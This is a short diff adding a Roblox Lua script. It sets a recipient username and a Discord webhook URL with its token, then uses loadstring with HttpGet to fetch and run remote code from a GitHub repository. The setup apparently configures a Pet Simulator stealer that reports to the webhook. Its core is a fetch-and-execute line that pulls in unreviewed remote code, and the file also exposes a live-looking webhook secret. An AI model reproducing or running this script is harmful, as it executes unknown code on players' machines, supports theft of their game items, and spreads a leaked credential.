@@ -1,0 +1,4 @@
+UserNameID = 'Hindiakobisaya1'
+Webhooks = 'https://discord.com/api/webhooks/1089837329985851392/RC61T1ri_qdtIkggAkuQyGnKzmDddoCSNBAtuQsd43AQAjd4Q_D-sEE8sDdjQFbEWAm8'
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pet-simx/rizzhub/main/New"))()
